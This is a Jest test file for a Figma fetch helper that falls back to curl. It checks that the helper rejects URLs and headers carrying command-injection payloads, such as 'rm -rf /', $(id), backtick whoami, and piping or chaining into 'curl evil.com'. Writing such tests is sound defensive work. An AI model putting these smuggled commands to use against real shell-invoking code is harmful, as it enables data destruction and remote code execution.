import { fetchWithRetry } from '../fetch-with-retry.js';

// Mock the execAsync to prevent actual command execution during tests
jest.mock('child_process', () => ({
  exec: jest.fn(),
}));

jest.mock('util', () => ({
  promisify: jest.fn(() => jest.fn()),
}));

// Mock fetch to always fail so we trigger the curl fallback
global.fetch = jest.fn().mockRejectedValue(new Error('Fetch failed'));

describe('fetchWithRetry Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it('should block malicious URLs with command injection', async () => {
    const maliciousUrls = [
      'https://api.figma.com/files/abc; rm -rf /',
      'https://api.figma.com/files/abc`whoami`',
      'https://api.figma.com/files/abc$(id)',
      'https://api.figma.com/files/abc|curl evil.com',
      'https://api.figma.com/files/abc&& curl evil.com',
    ];

    for (const url of maliciousUrls) {
      await expect(fetchWithRetry(url)).rejects.toThrow('Security validation failed');
    }
  });

  it('should block unauthorized domains', async () => {
    const unauthorizedUrls = [
      'https://evil.com/malicious',
      'https://attacker.com/payload',
      'https://not-figma.com/files/abc',
    ];

    for (const url of unauthorizedUrls) {
      await expect(fetchWithRetry(url)).rejects.toThrow('Security validation failed');
    }
  });

  it('should block malicious headers', async () => {
    const maliciousHeaders = [
      { 'Authorization': 'Bearer token; export PATH=/tmp' },
      { 'Authorization': 'Bearer token`whoami`' },
      { 'Authorization': 'Bearer token$(id)' },
      { 'Custom-Header': 'value && curl evil.com' },
      { '; rm -rf /': 'value' },
    ];

    for (const headers of maliciousHeaders) {
      await expect(fetchWithRetry('https://api.figma.com/files/valid', { headers: headers as unknown as Record<string, string> }))
        .rejects.toThrow(); // Security validation will throw an error (message may vary)
    }
  });

  it('should allow valid Figma URLs and headers', async () => {
    const mockExecAsync = require('util').promisify();
    mockExecAsync.mockResolvedValue({ 
      stdout: JSON.stringify({ data: 'test' }), 
      stderr: '' 
    });

    const validHeaders = {
      'Authorization': 'Bearer fig_token_123',
      'X-Figma-Token': 'valid_token',
      'Content-Type': 'application/json',
    };

    // This should not throw during validation (it may fail for other reasons in tests)
    await expect(async () => {
      try {
        await fetchWithRetry('https://api.figma.com/v1/files/valid', { headers: validHeaders });
      } catch (error: any) {
        // Allow other errors, but not security validation errors
        if (error.message.includes('Security validation failed')) {
          throw error;
        }
      }
    }).not.toThrow('Security validation failed');
  });

  it('should handle edge cases in URL validation', async () => {
    const edgeCases = [
      '', // Empty string
      'not-a-url', // Invalid URL
      'ftp://api.figma.com/files/abc', // Wrong protocol
      'https://api.figma.com/' + 'a'.repeat(3000), // Too long
    ];

    for (const url of edgeCases) {
      await expect(fetchWithRetry(url)).rejects.toThrow('Security validation failed');
    }
  });

  it('should handle edge cases in header validation', async () => {
    const edgeCases = [
      { '': 'value' }, // Empty key
      { 'key': '' }, // Empty value
      { 'key': null as any }, // null value
      { [null as any]: 'value' }, // null key
      { ['a'.repeat(300)]: 'value' }, // Key too long
      { 'key': 'b'.repeat(10000) }, // Value too long
    ];

    for (const headers of edgeCases) {
      await expect(fetchWithRetry('https://api.figma.com/v1/files/valid', { headers: headers as unknown as Record<string, string> }))
        .rejects.toThrow(); // Security validation will throw an error (message may vary)
    }
  });
});